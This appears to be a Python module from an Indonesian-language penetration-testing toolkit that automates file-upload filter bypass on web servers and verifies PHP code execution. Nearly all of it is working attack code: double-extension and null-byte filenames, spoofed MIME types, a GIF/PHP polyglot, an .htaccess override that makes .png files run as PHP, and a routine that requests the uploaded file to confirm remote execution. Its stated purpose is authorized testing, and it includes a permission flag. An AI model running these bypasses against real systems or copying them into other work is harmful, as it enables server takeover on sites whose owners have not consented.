"""Upload bypass kit: uji filter unggah file & eksekusi.

Otomatisasi verifikasi filter upload yang umum:
- ekstensi dobel (.php.jpg), null byte (PHP 5.x), case (.PhP)
- alternasi MIME-type / content-type
- polyglot gambar+PHP (header GIF89a + payload)
- file .htaccess override
- konfirmasi EKSEKUSI: setelah upload berhasil, request file untuk melihat
  apakah payload PHP dieksekusi (bukti RCE).

Modul ini MENG-UPLOAD file berisi payload; HANYA untuk target berizin.

GUARD: memerlukan `authorized=True`; tanpa itu modul menolak beroperasi.
Gunakan HANYA pada target dengan izin tertulis.
"""

import io
import re
from typing import Dict, List, Optional
from urllib.parse import urljoin

from keris.core.http import KerisHTTP
from keris.core.logger import debug, info, ok, warn
from keris.modules.scanner import Finding

PROOF = "keris_upload_rce_" + "9f3a2c"
PHP_PAYLOAD = f"<?php echo '{PROOF}';?>"

UPLOAD_ENDPOINTS = [
    "/upload", "/api/upload", "/uploads", "/api/files", "/api/avatar",
    "/profile/avatar", "/upload.php", "/file/upload", "/api/v1/upload",
]

# strategi bypass: (nama file, content-type, body)
def _bypass_variants(payload: bytes) -> List[Dict]:
    return [
        {"name": "keris.php", "ct": "application/octet-stream", "body": payload},
        {"name": "keris.php.jpg", "ct": "image/jpeg", "body": payload},
        {"name": "keris.jpg.php", "ct": "image/jpeg", "body": payload},
        {"name": "keris.PhP", "ct": "image/png", "body": payload},
        {"name": "keris.php%00.jpg", "ct": "image/jpeg", "body": payload},
        {"name": "keris.phtml", "ct": "image/gif", "body": payload},
        {"name": "keris.php7", "ct": "image/jpeg", "body": payload},
        {"name": ".htaccess", "ct": "text/plain",
         "body": b"AddType application/x-httpd-php .png\n"},
    ]


def _polyglot() -> bytes:
    """GIF header + payload PHP di komentar EXIF."""
    return b"GIF89a\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff" + b"\x00" * 20 + PHP_PAYLOAD.encode()


def _upload_one(client: KerisHTTP, ep: str, name: str, ct: str, body: bytes,
                extra_fields: Optional[Dict] = None) -> tuple:
    """Upload file multipart; return (status, body_text)."""
    files = {"file": (name, io.BytesIO(body), ct)}
    data = dict(extra_fields or {})
    try:
        r = client.post(ep, files=files, data=data, timeout=15)
        return r.status_code, r.text or ""
    except Exception as e:
        return None, str(e)


def _file_url(base: str, ep: str, name: str, uploaded_path: Optional[str]) -> str:
    """Tebak URL file hasil upload (bila server memberi path)."""
    if uploaded_path:
        return urljoin(base.rstrip("/") + "/", uploaded_path.lstrip("/"))
    # tebak lokasi umum
    for sub in ("/uploads/", "/files/", "/images/", "/avatars/", "/"):
        return urljoin(base.rstrip("/") + "/", sub.lstrip("/") + name)
    return base


def test_upload(base: str, client: KerisHTTP,
                endpoints: Optional[List[str]] = None,
                authorized: bool = False) -> List[Finding]:
    """Uji filter upload di endpoint umum, lalu verifikasi eksekusi."""
    if not authorized:
        warn("Upload bypass memerlukan --authorized.")
        return []
    findings: List[Finding] = []
    targets = [e for e in (endpoints or UPLOAD_ENDPOINTS)]
    for ep in targets:
        full = urljoin(base.rstrip("/") + "/", ep.lstrip("/"))
        # 1. upload normal .php -> buktikan blokir baseline
        code0, _ = _upload_one(client, full, "keris.php", "application/x-php", PHP_PAYLOAD.encode())
        # 2. coba variant bypass
        variants = _bypass_variants(PHP_PAYLOAD.encode())
        variants.append({"name": "keris.png", "ct": "image/png", "body": _polyglot()})
        for v in variants:
            code, body = _upload_one(client, full, v["name"], v["ct"], v["body"])
            if code is None:
                continue
            info(f"  {ep}: {v['name']} -> {code}")
            # 3. verifikasi eksekusi (bila ada indikasi upload sukses)
            if code in (200, 201, 202, 204) or "keris." in body or "success" in body.lower():
                fu = _file_url(base, full, v["name"], None)
                try:
                    rr = client.get(fu, timeout=12)
                    if PROOF in (rr.text or ""):
                        findings.append(Finding(
                            "CRITICAL", "Upload file eksekusi RCE (bypass filter)",
                            full,
                            f"Variant `{v['name']}` (content-type {v['ct']}) "
                            f"berhasil di-upload DAN dieksekusi: payload PHP "
                            f"memunculkan `{PROOF}`.",
                            f"url={fu}\ncontent-type={v['ct']}",
                            cwe="CWE-434",
                            references="https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload",
                        ))
                        ok(f"  UPLOAD RCE: {v['name']} dieksekusi di {fu}")
                        return findings
                except Exception:
                    pass
                # upload sukses tapi belum terbukti eksekusi
                findings.append(Finding(
                    "HIGH", "Upload tidak terfilter (butuh verifikasi eksekusi)",
                    full,
                    f"`{v['name']}` (content-type {v['ct']}) diterima server "
                    f"(status {code}); belum terbukti dieksekusi — periksa "
                    f"file di lokasi upload.",
                    f"filename={v['name']}",
                    cwe="CWE-434",
                ))
    if not findings:
        debug("Tidak ada endpoint upload yang menerima file bypass")
    return findings
